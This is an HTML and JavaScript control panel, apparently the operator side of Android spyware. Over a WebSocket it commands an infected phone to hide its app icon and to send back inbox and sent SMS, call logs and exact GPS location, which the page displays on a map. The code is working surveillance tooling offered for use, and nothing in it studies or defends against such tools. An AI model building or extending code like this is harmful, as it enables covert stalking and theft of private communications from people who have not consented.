<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Device Command Center</title>
<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>

<style>

body{
    font-family:'Segoe UI',sans-serif;
    background:#0b0b0b;
    color:#e0e0e0;
    margin:0;
    display:flex;
    flex-direction:column;
    height:100vh;
    overflow:hidden;
}

/* HEADER */
.header{
    background:#111;
    padding:12px 20px;
    display:flex;
    justify-content:space-between;
    align-items:center;
    border-bottom:1px solid #222;
}

.status-badge{
    padding:6px 14px;
    border-radius:20px;
    font-weight:bold;
}

.online{
    background:#1b5e20;
    color:#a5d6a7;
}

.offline{
    background:#b71c1c;
    color:#ef9a9a;
}

.net-info{
    font-family:monospace;
    color:#64b5f6;
}

/* MAIN LAYOUT */
.main-container{
    display:flex;
    flex:1;
}

/* CONTROLS */
.controls-panel{
    width:300px;
    background:#111;
    padding:20px;
    border-right:1px solid #222;
    overflow-y:auto;
}

.btn-group h3{
    color:#90caf9;
    border-bottom:1px solid #333;
    padding-bottom:5px;
}

button{
    width:100%;
    padding:11px;
    margin-bottom:8px;
    background:#1f1f1f;
    color:white;
    border:none;
    border-radius:8px;
    cursor:pointer;
    transition:.2s;
}

button:hover{
    background:#2a2a2a;
}

/* ðŸ”¥ TOGGLE BUTTON */
.toggle-on{
    background:#2e7d32;
}

.toggle-off{
    background:#5a1a1a;
}

/* OUTPUT PANEL */
.output-panel{
    flex:1;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#050505;
}

/* ðŸ”¥ PREMIUM PHONE DESIGN */
.mobile-frame{
    width:360px;
    height:720px;
    background:#000;
    border-radius:38px;
    padding:10px;
    box-shadow:
        0 0 0 2px #333,
        0 20px 60px rgba(0,0,0,.9),
        inset 0 0 20px rgba(255,255,255,.05);
    position:relative;
}

/* notch */
.mobile-frame:before{
    content:"";
    position:absolute;
    top:8px;
    left:50%;
    transform:translateX(-50%);
    width:140px;
    height:22px;
    background:#111;
    border-radius:20px;
}

.mobile-content-wrapper{
    background:#121212;
    height:100%;
    border-radius:28px;
    overflow:hidden;
    display:flex;
    flex-direction:column;
}

/* header inside phone */
.mobile-header{
    padding:12px;
    text-align:center;
    font-weight:bold;
    background:#181818;
    border-bottom:1px solid #333;
}

/* content */
.mobile-content{
    flex:1;
    overflow-y:auto;
    padding:10px;
}

/* data cards */
.data-card{
    background:#1c1c1c;
    padding:12px;
    margin-bottom:10px;
    border-radius:10px;
    border-left:4px solid #64b5f6;
}

.label{
    color:#888;
    font-size:.75em;
}

/* MAP */
#map{
    height:100%;
    width:100%;
}

.gps-info{
    position:absolute;
    top:0;
    left:0;
    width:100%;
    background:rgba(0,0,0,.85);
    padding:10px;
    z-index:999;
    font-size:.8em;
}

</style>
</head>

<body>

<div class="header">
    <div class="status-badge offline" id="connectionStatus">
        DEVICE: OFFLINE
    </div>
    <div class="net-info" id="networkInfo">
        WAITING FOR NETWORK DATA...
    </div>
</div>

<div class="main-container">

    <!-- CONTROLS -->
    <div class="controls-panel">

        <div class="btn-group">
            <h3>App Management</h3>

            <!-- ðŸ”¥ TOGGLE BUTTON -->
            <button id="toggleAppBtn"
                class="toggle-off"
                onclick="toggleAppVisibility()">
                Show App Icon
            </button>

        </div>

        <div class="btn-group">
            <h3>Communications</h3>

            <button onclick="sendCommand('getSMS inbox')">
                Get Inbox SMS
            </button>

            <button onclick="sendCommand('getSMS sent')">
                Get Sent SMS
            </button>

            <button onclick="sendCommand('getCallLogs')">
                Get Call Logs
            </button>
        </div>

        <div class="btn-group">
            <h3>Tracking</h3>
            <button onclick="sendCommand('getLocation')">
                Get Exact GPS Location
            </button>
        </div>

    </div>

    <!-- MOBILE -->
    <div class="output-panel">

        <div class="mobile-frame">

            <div class="mobile-content-wrapper">

                <div class="mobile-header"
                     id="outputHeader">
                     Output View
                </div>

                <div class="mobile-content"
                     id="outputContent">

                    <div style="text-align:center;color:#555;margin-top:50%;">
                        Select an option from the control panel.
                    </div>

                </div>

            </div>
        </div>

    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>

const ws = new WebSocket("wss://" + window.location.host);
let mapInstance = null;

/* ðŸ”¥ TOGGLE LOGIC */
let appHidden = false;

function toggleAppVisibility(){

    const btn = document.getElementById("toggleAppBtn");

    if(appHidden){

        sendCommand("showApp");

        btn.innerText="Hide App Icon";
        btn.className="toggle-on";

    }else{

        sendCommand("hideApp");

        btn.innerText="Show App Icon";
        btn.className="toggle-off";
    }

    appHidden = !appHidden;
}

/* ---------- EXISTING SOCKET CODE (UNCHANGED) ---------- */

ws.onmessage = (event) => {

    const msg = event.data;

    if (msg.startsWith("STATUS:")) {

        const status = msg.split(":")[1];
        const badge = document.getElementById('connectionStatus');

        badge.className =
            status === 'ONLINE'
            ? 'status-badge online'
            : 'status-badge offline';

        badge.innerText = "DEVICE: " + status;
    }

    else if (msg.startsWith("NET_INFO:")) {
        document.getElementById('networkInfo').innerText =
            msg.split(":")[1];
    }

    else if (msg.startsWith("SMS_DATA:")) {
        renderSMS(JSON.parse(msg.substring(9)));
    }

    else if (msg.startsWith("CALL_DATA:")) {
        renderCalls(JSON.parse(msg.substring(10)));
    }

    else if (msg.startsWith("LOC_DATA:")) {
        renderLocation(JSON.parse(msg.substring(9)));
    }
};

function sendCommand(cmd){

    ws.send(cmd);

    document.getElementById('outputContent').innerHTML =
        '<div style="text-align:center;padding:20px;">Fetching Data...</div>';
}

/* ---------- RENDER FUNCTIONS (UNCHANGED) ---------- */

function renderSMS(data){

    const container = document.getElementById('outputContent');
    document.getElementById('outputHeader').innerText = "SMS Messages";

    container.innerHTML = "";

    data.forEach(sms=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
            <div><span class="label">TYPE:</span> <b>${sms.type}</b></div>
            <div><span class="label">FROM:</span> ${sms.number}</div>
            <div><span class="label">MSG:</span> ${sms.content}</div>
            <div><span class="label">TIME:</span> ${sms.date}</div>
        `;

        container.appendChild(card);
    });
}

function renderCalls(data){

    const container = document.getElementById('outputContent');
    document.getElementById('outputHeader').innerText = "Call Logs";

    container.innerHTML="";

    data.forEach(call=>{

        const card=document.createElement('div');
        card.className="data-card";

        card.innerHTML=`
            <div><span class="label">TYPE:</span> <b>${call.type}</b></div>
            <div><span class="label">CONTACT:</span> ${call.number}</div>
            <div><span class="label">DURATION:</span> ${call.duration}</div>
            <div><span class="label">TIME:</span> ${call.date}</div>
        `;

        container.appendChild(card);
    });
}

function renderLocation(data){

    const container=document.getElementById('outputContent');
    document.getElementById('outputHeader').innerText="GPS Tracking";

    container.innerHTML="";

    if(data.error){
        container.innerHTML=
            `<div style="color:red;text-align:center;">${data.error}</div>`;
        return;
    }

    const infoDiv=document.createElement('div');
    infoDiv.className='gps-info';

    infoDiv.innerHTML=`
        <div><b>LAT:</b> ${data.lat}</div>
        <div><b>LON:</b> ${data.lon}</div>
        <div><b>ACCURACY:</b> ${data.acc} meters</div>
    `;

    container.appendChild(infoDiv);

    const mapDiv=document.createElement('div');
    mapDiv.id="map";
    container.appendChild(mapDiv);

    setTimeout(()=>{

        if(mapInstance) mapInstance.remove();

        mapInstance=L.map('map')
            .setView([data.lat,data.lon],15);

        L.tileLayer(
            'https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png'
        ).addTo(mapInstance);

        L.marker([data.lat,data.lon])
            .addTo(mapInstance);

        L.circle([data.lat,data.lon],{
            radius:data.acc
        }).addTo(mapInstance);

    },100);
}

ws.onopen=()=>ws.send("I_AM_WEB");

</script>

</body>
</html>
